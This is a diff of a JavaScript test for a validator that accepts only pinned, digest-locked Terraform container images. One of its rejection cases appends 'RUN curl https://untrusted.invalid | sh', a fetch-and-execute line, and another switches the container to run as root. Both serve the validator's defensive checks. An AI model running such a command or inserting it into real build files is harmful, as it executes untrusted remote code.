@@ -15,7 +15,7 @@ test('Fleet fixture tooling accepts only the exact two pinned built-in-provider 
   const accepted = validateFleetTooling(source);
   assert.match(accepted.terraform, /terraform:1\.16\.0@sha256:[a-f0-9]{64}$/);
   validateFleetTooling(source.replaceAll('\n','\r\n'));
-  for (const changed of [source.replace('terraform:1.16.0','terraform:1.16.1'),source.replace('5cf287','6cf287'),source+'\nRUN curl https://untrusted.invalid | sh\n',source.replace('USER 10001:10001','USER 0:0')]) assert.throws(() => validateFleetTooling(changed));
+  for (const changed of [source.replace('terraform:1.16.0','terraform:1.16.1'),source.replace('32fa28','42fa28'),source+'\nRUN curl https://untrusted.invalid | sh\n',source.replace('USER 10001:10001','USER 0:0')]) assert.throws(() => validateFleetTooling(changed));
 });
 
 test('Fleet lab rejects foreign ownership, image substitution and credential-bearing containers', () => {
